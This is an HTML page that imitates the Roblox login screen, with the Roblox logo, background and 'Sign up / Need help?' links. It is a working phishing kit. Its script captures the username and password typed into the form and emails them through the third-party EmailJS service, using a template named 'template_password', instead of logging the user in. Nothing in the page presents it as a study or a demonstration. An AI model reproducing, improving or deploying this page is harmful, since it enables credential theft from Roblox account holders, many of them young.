<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox login</title>
   <link rel="icon" type="image/x-icon" href="RBLX.png">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* Background styling */
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: url("https://assets.codepen.io/1468070/Roblox+Background.jpg") no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
      position: relative;
    }

    /* Dark gradient overlay like Roblox login */
    body::before {
      content: "";
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6));
      z-index: 1;
    }

    /* Center container */
    #login-screen {
      position: relative;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: white;
    }

    /* Logo */
    #login-screen img {
      width: 200px;
      margin-bottom: 20px;
    }

    /* Form styling */
    form {
      background: rgba(0, 0, 0, 0.8);
      padding: 30px;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      width: 300px;
    }

    input {
      margin-bottom: 15px;
      padding: 10px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
    }

    /* Black Sign In button */
    .login-button {
      background: black;
      color: white;
      padding: 10px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-button:hover {
      background: #222;
    }

    /* White links */
    .alternate-options {
      margin-top: 10px;
      font-size: 12px;
      text-align: center;
    }

    .alternate-options a {
      color: white;
      text-decoration: none;
    }

    .alternate-options a:hover {
      text-decoration: underline;
    }

    .alternate-options .dot {
      color: white;
      margin: 0 5px;
    }
  </style>
</head>
<body>

<div id="login-screen">
  <img src="https://assets.codepen.io/1468070/Roblox+Logo.svg" alt="Logo" />
  <form id="login-form">
    <input type="text" name="username" placeholder="Username" required />
    <input type="password" name="password" placeholder="Password" required />
    <button class="login-button" type="submit">Log In</button>
    <div class="alternate-options">
      <a href="#">Sign up</a>
      <span class="dot">·</span>
      <a href="#">Use another device</a>
      <span class="dot">·</span>
      <a href="#">Need help?</a>
    </div>
  </form>
</div>

<!-- EmailJS Script -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init("7xjw2eNW29DZa_kKu");  // Your EmailJS public key
  })();

  document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();  // Prevent the form from reloading the page

    // Send form data to EmailJS using your service and template IDs
    emailjs.sendForm("service_pzkhpjd", "template_password", this)
      .then(function(response) {
        alert("Form sent successfully!");
        document.getElementById("login-form").reset();  // Reset the form after submission
      }, function(error) {
        alert("Error sending form: " + JSON.stringify(error));
      });
  });
</script>

</body>
</html>
